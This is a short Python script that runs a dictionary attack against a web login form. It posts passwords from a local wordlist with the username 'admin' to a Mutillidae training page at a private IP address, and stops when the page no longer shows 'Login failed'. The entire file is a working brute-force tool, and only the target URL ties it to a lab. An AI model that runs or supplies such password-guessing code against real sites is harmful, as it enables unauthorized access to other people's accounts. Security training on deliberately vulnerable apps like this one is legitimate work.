#!/usr/bin/env python
# Simple dictionary attack on webpage login - Requires username to test

import requests


target_url = "http://192.0.0.17/mutillidae/index.php?page=login.php"
data_dict = {"username": "admin", "password": "", "Login": "submit"}

with open("/root/Downloads/passwords.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print("[+] Got the password --> " + word)
            exit()

print("[+] Reached end of line.")
